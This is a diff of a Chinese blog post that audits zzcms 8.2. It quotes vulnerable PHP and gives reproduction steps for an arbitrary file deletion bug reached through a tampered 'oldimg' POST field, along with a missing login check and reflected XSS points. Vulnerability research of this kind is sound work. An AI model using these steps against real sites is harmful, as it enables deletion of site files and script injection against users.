-继续看</code>/user/adv.php`其他代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"img"</span>]))&#123;</span><br><span class="line">    $img=$_REQUEST[<span class="string">"img"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $img=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"oldimg"</span>]))&#123;</span><br><span class="line">    $oldimg=$_REQUEST[<span class="string">"oldimg"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $oldimg=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> ($action==<span class="string">"modify"</span>)&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ($oldimg&lt;&gt;$img)&#123;</span><br><span class="line">        $f=<span class="string">"../"</span>.$oldimg;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($f))&#123;</span><br><span class="line">        unlink($f);		</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($action==<span class="string">"add"</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> ($oldimg&lt;&gt;$img &amp;&amp; $oldimg!=<span class="string">''</span>)&#123;</span><br><span class="line">        $f=<span class="string">"../"</span>.$oldimg;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($f))&#123;</span><br><span class="line">            unlink($f);		</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+继续看</code>/user/adv.php`其他代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"img"</span>]))&#123;</span><br><span class="line">    $img=$_REQUEST[<span class="string">"img"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $img=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"oldimg"</span>]))&#123;</span><br><span class="line">    $oldimg=$_REQUEST[<span class="string">"oldimg"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $oldimg=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> ($action==<span class="string">"modify"</span>)&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ($oldimg&lt;&gt;$img)&#123;</span><br><span class="line">        $f=<span class="string">"../"</span>.$oldimg;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($f))&#123;</span><br><span class="line">        unlink($f);		</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($action==<span class="string">"add"</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> ($oldimg&lt;&gt;$img &amp;&amp; $oldimg!=<span class="string">''</span>)&#123;</span><br><span class="line">        $f=<span class="string">"../"</span>.$oldimg;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($f))&#123;</span><br><span class="line">            unlink($f);		</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>这里看到 img 和 oldimg 的值取自 request 数组，抓包可以看到实际来自 post 数组，而前面<code>/inc/stopsqlin.php</code>文件中对 post 的处理中并没有过滤<code>.</code>、<code>/</code>字符，导致可以跨目录删除文件。<br>action 的值提交时来自 get 数组，当其值为 modify 或者 add 时，只要 img 和 oldimg 值不相等，都会导致该漏洞。因为之前我添加过广告了，这里就用 modify 的条件语句复现一下。<br>先随便在网站根目录找一个目录，这里用 ask 目录，在该目录下创建一个 test 文件。</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/12.png" alt="12"></p>
 <p>然后抓包改一下 img 和 oldimg：</p>
@@ -433,46 +206,78 @@
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/15.png" alt="15"></p>
 <p>可以看到我去掉了 cookie。再去看一下 ll.php 文件所在目录：</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/16.png" alt="16"></p>
-<p>成功将 ll.php 删除了。<br>在<code>/user/licence_save.php</code>中，也存在相同的问题：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /user/licence_save.php line 19</span></span><br><span class="line">$img=trim($_POST[<span class="string">"img"</span>]); <span class="comment">// post中取出img</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"action"</span>]==<span class="string">"add"</span>)&#123; </span><br><span class="line">  ...</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($_GET[<span class="string">"action"</span>]==<span class="string">"modify"</span>)&#123;</span><br><span class="line">    $oldimg=trim($_POST[<span class="string">"oldimg"</span>]); <span class="comment">// post中取出oldimg</span></span><br><span class="line">    $id=$_POST[<span class="string">"id"</span>];</span><br><span class="line">    <span class="keyword">if</span> ($id==<span class="string">""</span> || is_numeric($id)==<span class="keyword">false</span>)&#123; <span class="comment">// id必须是数字字符串</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">if</span> ($oldimg&lt;&gt;$img &amp;&amp; $oldimg&lt;&gt;<span class="string">"/image/nopic.gif"</span>)&#123; </span><br><span class="line">        $f=<span class="string">"../"</span>.$oldimg;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($f))&#123;</span><br><span class="line">            unlink($f);</span><br><span class="line">        &#125;</span><br><span class="line">        $fs=<span class="string">"../"</span>.str_replace(<span class="string">"."</span>,<span class="string">"_small."</span>,$oldimg).<span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($fs))&#123;</span><br><span class="line">            unlink($fs);		</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
+<p>成功将 ll.php 删除了。<br>在<code>/user/licence_save.php</code>中，也存在相同的问题：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /user/licence_save.php line 19</span></span><br><span class="line">$img=trim($_POST[<span class="string">"img"</span>]); <span class="comment">// post中取出img</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"action"</span>]==<span class="string">"add"</span>)&#123; </span><br><span class="line">  ...</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($_GET[<span class="string">"action"</span>]==<span class="string">"modify"</span>)&#123;</span><br><span class="line">    $oldimg=trim($_POST[<span class="string">"oldimg"</span>]); <span class="comment">// post中取出oldimg</span></span><br><span class="line">    $id=$_POST[<span class="string">"id"</span>];</span><br><span class="line">    <span class="keyword">if</span> ($id==<span class="string">""</span> || is_numeric($id)==<span class="keyword">false</span>)&#123; <span class="comment">// id必须是数字字符串</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">if</span> ($oldimg&lt;&gt;$img &amp;&amp; $oldimg&lt;&gt;<span class="string">"/image/nopic.gif"</span>)&#123; </span><br><span class="line">        $f=<span class="string">"../"</span>.$oldimg;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($f))&#123;</span><br><span class="line">            unlink($f);</span><br><span class="line">        &#125;</span><br><span class="line">        $fs=<span class="string">"../"</span>.str_replace(<span class="string">"."</span>,<span class="string">"_small."</span>,$oldimg).<span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($fs))&#123;</span><br><span class="line">            unlink($fs);		</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
 <p>用 vscode 全局搜索一下 oldimg：</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/17.png" alt="17"></p>
 <p>发现 /user 目录下的 manage.php、ppsave.php、zssave.php文件都存在一样的问题。实际上在 /admin 目录下的一些文件中也存在类似问题。<br>随便看一个<code>/admin/ad_user_modify.php</code></p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/18.png" alt="18"></p>
-<p>找到 oldimg 的位置：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($oldimg&lt;&gt;$img &amp;&amp; $oldimg&lt;&gt;<span class="string">"/image/nopic.gif"</span> )&#123;</span><br><span class="line">    $f=<span class="string">"../"</span>.$oldimg;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($f))&#123;</span><br><span class="line">        unlink($f);		</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>找到 oldimg 的位置：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($oldimg&lt;&gt;$img &amp;&amp; $oldimg&lt;&gt;<span class="string">"/image/nopic.gif"</span> )&#123;</span><br><span class="line">    $f=<span class="string">"../"</span>.$oldimg;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($f))&#123;</span><br><span class="line">        unlink($f);		</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>访问一下该页面，可以看到是一个修改广告信息的页面：</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/19.png" alt="19"></p>
-<p>找到相应源码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// /admin/ad_user_modify.php line 52</span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">class</span>=<span class="string">"border"</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>图片地址<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"oldimg"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">id</span>=<span class="string">"oldimg"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo $row["</span><span class="attr">img</span>"]?&gt;</span>"&gt;</span><br></pre></td></tr></table></figure></p>
-<p>可以看到该表单提交上来的 oldimg 的 type 属性是 hidden，我们只需要抓包后修改即可。<br>再看一下<code>/admin/ad_user_modify.php</code>中的源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$action = <span class="keyword">isset</span>($_POST[<span class="string">'action'</span>])?$_POST[<span class="string">'action'</span>]:<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($action==<span class="string">"modify"</span>)&#123;</span><br><span class="line">  ...</span><br><span class="line">    <span class="keyword">if</span> ($oldimg&lt;&gt;$img &amp;&amp; $oldimg&lt;&gt;<span class="string">"/image/nopic.gif"</span> )&#123;</span><br><span class="line">        $f=<span class="string">"../"</span>.$oldimg;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($f))&#123;</span><br><span class="line">        unlink($f);		</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>因为该文件在 /admin 目录，所以需要登录后台管理的权限。<br>抓包后将 post 中的数据改为 <code>oldimg=filename&amp;img=xxx&amp;action=modify</code>即可。<br>在 /user 目录下的文件删除漏洞其实不需要前台用户登录，因为其验证登录状态的<code>/user/check.php</code>文件并没有终止脚本的执行，而 /admin 目录下的验证用户身份的文件<code>/admin/admin.php</code>中如果身份出错就会调用 showmsg()。<br>该方法定义在<code>/inc/function.php</code>中，其中调用了 exit：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /inc/function.php line 22</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showmsg</span><span class="params">($msg,$zc_url = <span class="string">'back'</span>)</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>找到相应源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// /admin/ad_user_modify.php line 52</span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">class</span>=<span class="string">"border"</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>图片地址<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"oldimg"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">id</span>=<span class="string">"oldimg"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo $row["</span><span class="attr">img</span>"]?&gt;</span>"&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到该表单提交上来的 oldimg 的 type 属性是 hidden，我们只需要抓包后修改即可。<br>再看一下<code>/admin/ad_user_modify.php</code>中的源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$action = <span class="keyword">isset</span>($_POST[<span class="string">'action'</span>])?$_POST[<span class="string">'action'</span>]:<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($action==<span class="string">"modify"</span>)&#123;</span><br><span class="line">  ...</span><br><span class="line">    <span class="keyword">if</span> ($oldimg&lt;&gt;$img &amp;&amp; $oldimg&lt;&gt;<span class="string">"/image/nopic.gif"</span> )&#123;</span><br><span class="line">        $f=<span class="string">"../"</span>.$oldimg;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($f))&#123;</span><br><span class="line">        unlink($f);		</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为该文件在 /admin 目录，所以需要登录后台管理的权限。<br>抓包后将 post 中的数据改为 <code>oldimg=filename&amp;img=xxx&amp;action=modify</code>即可。<br>在 /user 目录下的文件删除漏洞其实不需要前台用户登录，因为其验证登录状态的<code>/user/check.php</code>文件并没有终止脚本的执行，而 /admin 目录下的验证用户身份的文件<code>/admin/admin.php</code>中如果身份出错就会调用 showmsg()。<br>该方法定义在<code>/inc/function.php</code>中，其中调用了 exit：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /inc/function.php line 22</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showmsg</span><span class="params">($msg,$zc_url = <span class="string">'back'</span>)</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>相关目录：<br>/inc：网站所需包含的各种文件的存放目录<br>/install：安装程序目录。<br>/zx：资讯。</p>
-<p>通过上面的审计，可以发现大部分文件都会在开头包含<code>/inc/conn.php</code>文件去连接数据库，而该文件中包含的<code>/inc/stopsqlin.php</code>文件会对 gpc 中的数据进行过滤。<br>而<code>/inc/top.php</code>文件中，并没有包含<code>/inc/conn.php</code>文件，所以传入其中的数据并没有进行过滤。看一下<code>/inc/top.php</code>开头部分的代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//echo $_SERVER['REQUEST_URI'];</span></span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">"action"</span>]==<span class="string">"search"</span>)&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;location.href='"</span>.@$_POST[<span class="string">"lb"</span>].<span class="string">"/search.php?keyword="</span>.@$_POST[<span class="string">"keyword"</span>].<span class="string">"'&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>通过上面的审计，可以发现大部分文件都会在开头包含<code>/inc/conn.php</code>文件去连接数据库，而该文件中包含的<code>/inc/stopsqlin.php</code>文件会对 gpc 中的数据进行过滤。<br>而<code>/inc/top.php</code>文件中，并没有包含<code>/inc/conn.php</code>文件，所以传入其中的数据并没有进行过滤。看一下<code>/inc/top.php</code>开头部分的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//echo $_SERVER['REQUEST_URI'];</span></span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">"action"</span>]==<span class="string">"search"</span>)&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;location.href='"</span>.@$_POST[<span class="string">"lb"</span>].<span class="string">"/search.php?keyword="</span>.@$_POST[<span class="string">"keyword"</span>].<span class="string">"'&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>可以看到这里将部分跳转网页的 js 代码和 post 中的数据进行了拼接，而上面说到，因为该文件中没有包含对 gpc 数据进行的处理的<code>/inc/stopsqlin.php</code>文件，导致该处代码存在 xss 漏洞。</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/20.png" alt="20"></p>
-<p>在<code>uploadimg_form.php</code>中也存在着同样的漏洞：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"UserName"</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SESSION[<span class="string">"admin"</span>]))&#123;</span></span><br><span class="line"><span class="php">    session_write_close();</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"No Login!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"uploadimg.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">onSubmit</span>=<span class="string">"return mysub()"</span> <span class="attr">style</span>=<span class="string">"padding:10px"</span> <span class="attr">target</span>=<span class="string">"doaction"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"esave"</span> <span class="attr">style</span>=<span class="string">"position:absolute; top:0px; left:0px; z-index:10; visibility:hidden; width: 100%; height: 77px; background-color: #FFFFFF; layer-background-color: #FFFFFF; border: 1px none #000000;"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/loading.gif"</span> <span class="attr">width</span>=<span class="string">"24"</span> <span class="attr">height</span>=<span class="string">"24"</span> /&gt;</span>正在上传中...请稍候！<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"g_fu_image[]"</span> /&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"noshuiyin"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">id</span>=<span class="string">"noshuiyin"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo @$_GET['noshuiyin']?&gt;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"imgid"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">id</span>=<span class="string">"imgid"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo @$_GET['imgid']?&gt;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>在<code>uploadimg_form.php</code>中也存在着同样的漏洞：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"UserName"</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SESSION[<span class="string">"admin"</span>]))&#123;</span></span><br><span class="line"><span class="php">    session_write_close();</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"No Login!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"uploadimg.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">onSubmit</span>=<span class="string">"return mysub()"</span> <span class="attr">style</span>=<span class="string">"padding:10px"</span> <span class="attr">target</span>=<span class="string">"doaction"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"esave"</span> <span class="attr">style</span>=<span class="string">"position:absolute; top:0px; left:0px; z-index:10; visibility:hidden; width: 100%; height: 77px; background-color: #FFFFFF; layer-background-color: #FFFFFF; border: 1px none #000000;"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/loading.gif"</span> <span class="attr">width</span>=<span class="string">"24"</span> <span class="attr">height</span>=<span class="string">"24"</span> /&gt;</span>正在上传中...请稍候！<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"g_fu_image[]"</span> /&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"noshuiyin"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">id</span>=<span class="string">"noshuiyin"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo @$_GET['noshuiyin']?&gt;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"imgid"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">id</span>=<span class="string">"imgid"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo @$_GET['imgid']?&gt;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>该页面是一个上传文件的页面：</p>
 <p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/zzcms%208.2/21.png" alt="21"></p>
-<p>可以看到上面的表单代码中，有两处直接将 get 数组中的字段拼接进 html 代码中：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"noshuiyin"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">id</span>=<span class="string">"noshuiyin"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo @$_GET['noshuiyin']?&gt;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"imgid"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">id</span>=<span class="string">"imgid"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo @$_GET['imgid']?&gt;"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到上面的表单代码中，有两处直接将 get 数组中的字段拼接进 html 代码中：</p>
